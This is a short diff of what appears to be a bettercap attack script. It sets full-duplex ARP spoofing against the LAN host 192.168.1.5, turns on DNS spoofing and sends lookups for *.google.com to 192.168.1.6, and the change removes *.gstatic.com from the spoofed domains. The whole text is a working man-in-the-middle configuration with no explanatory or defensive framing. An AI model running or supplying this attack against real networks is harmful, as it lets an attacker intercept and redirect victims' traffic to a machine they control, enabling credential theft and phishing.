@@ -1,7 +1,7 @@
 set arp.spoof.targets 192.168.1.5
 set arp.spoof.fullduplex true
 set dns.spoof.all true
-set dns.spoof.domains *.google.com, *.gstatic.com
+set dns.spoof.domains *.google.com
 set dns.spoof.address 192.168.1.6
 
 arp.spoof on
